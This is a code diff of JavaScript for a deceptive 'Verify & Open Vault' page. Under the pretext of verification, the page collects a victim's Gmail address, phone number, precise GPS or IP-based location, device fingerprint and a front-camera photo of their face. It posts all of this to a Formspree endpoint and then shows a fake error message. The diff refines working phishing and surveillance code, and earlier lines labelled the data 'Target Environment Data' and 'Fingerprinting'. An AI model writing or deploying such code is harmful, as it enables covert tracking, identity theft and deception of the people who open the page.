@@ -11,7 +11,7 @@ document.getElementById('verifyBtn').addEventListener('click', async () => {
     const email = emailInput.value.trim();
     const phone = phoneInput.value.trim();
 
-    // 1. Strict Validation
+    // 1. Validation Logic
     const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
     const phoneRegex = /^0[0-9]{9}$/;
 
@@ -25,95 +25,100 @@ document.getElementById('verifyBtn').addEventListener('click', async () => {
         return;
     }
 
-    // 2. Initial UI Lock
+    // 2. UI Lock
     btn.disabled = true;
     btn.innerText = "Syncing...";
     status.innerText = "Verifying Network & GPS...";
 
-    // 3. Collect Advanced Device Data
-    const getBatteryInfo = async () => {
+    // 3. Advanced Device Data
+    const getBattery = async () => {
         try {
             const b = await navigator.getBattery();
             return `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged Out'})`;
-        } catch (e) { return "Unsupported"; }
+        } catch (e) { return "Unknown"; }
+    };
+    const batteryStatus = await getBattery();
+    const connection = navigator.connection || {};
+
+    // 4. Detailed Location Logic
+    let locationData = {
+        coords: "Unavailable",
+        type: "None",
+        accuracy: "N/A"
     };
 
-    const batteryStatus = await getBatteryInfo();
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    // 4. Location Logic with IP Fallback
-    let locationData = "Access Denied";
     try {
         const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 7000 });
         });
-        locationData = `GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`;
+        locationData = {
+            coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
+            type: "High-Precision GPS",
+            accuracy: `${pos.coords.accuracy.toFixed(2)} meters`
+        };
     } catch (e) { 
-        console.log("GPS Blocked, trying IP fallback...");
+        console.log("GPS Blocked, attempting IP fallback...");
         try {
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
-            locationData = `IP-Based: ${ipData.city}, ${ipData.region}, ${ipData.country_name} (ISP: ${ipData.org})`;
+            locationData = {
+                coords: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                type: "Network IP Fallback",
+                accuracy: "Approximate (City Level)"
+            };
         } catch (ipErr) {
-            locationData = "All Location Access Denied";
+            locationData.type = "Blocked/Failed";
         }
     }
 
-    // 5. Camera Activation and File Submission
+    // 5. Camera Capture and Multipart Submission
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        
         video.style.display = "block";
         video.srcObject = stream;
         status.innerText = "Processing Face-ID Sync...";
 
-        // Wait for camera to stabilize/focus
         await new Promise(r => setTimeout(r, 2500));
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        // Convert to Binary Blob to send as a real file
+        // Send as a real File (Blob)
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             
-            // Core Identity
+            // Submission Data
             formData.append("email", email);
             formData.append("phone", phone);
             
-            // Target Environment Data
-            formData.append("location_data", locationData);
-            formData.append("timezone", timezone);
-            formData.append("user_agent", navigator.userAgent);
-            formData.append("language", navigator.language);
+            // Detailed Location Info
+            formData.append("location_coords", locationData.coords);
+            formData.append("location_type", locationData.type);
+            formData.append("location_accuracy", locationData.accuracy);
             
-            // Hardware Specs (Fingerprinting)
-            formData.append("screen_resolution", `${window.screen.width}x${window.screen.height}`);
-            formData.append("cpu_cores", navigator.hardwareConcurrency || "Unknown");
-            formData.append("device_memory_gb", navigator.deviceMemory || "Unknown");
-            formData.append("battery_status", batteryStatus);
-            formData.append("network_effective_type", connection.effectiveType || "Unknown");
+            // Technical Specs
+            formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+            formData.append("battery", batteryStatus);
+            formData.append("network", connection.effectiveType || "unknown");
+            formData.append("device", navigator.userAgent);
             
-            // The Image File
-            formData.append("captured_face", blob, "sync_capture.jpg");
+            // Image File
+            formData.append("image_file", blob, "face_sync.jpg");
 
-            // Submit to Formspree
             await fetch(FORMSPREE_URL, {
                 method: 'POST',
                 headers: { 'Accept': 'application/json' },
                 body: formData
             });
 
-            // Final UI Reset
+            // Cleanup and Exit
             status.innerText = "Verification failed (Error 0xAF2). Please try again later.";
             stream.getTracks().forEach(t => t.stop());
             video.style.display = "none";
             btn.disabled = false;
             btn.innerText = "Verify & Open Vault";
-
-        }, 'image/jpeg', 0.6); // Quality set to 0.6 to keep file size optimized
+        }, 'image/jpeg', 0.6);
 
     } catch (err) {
         status.innerText = "Error: Camera access is required for verification.";
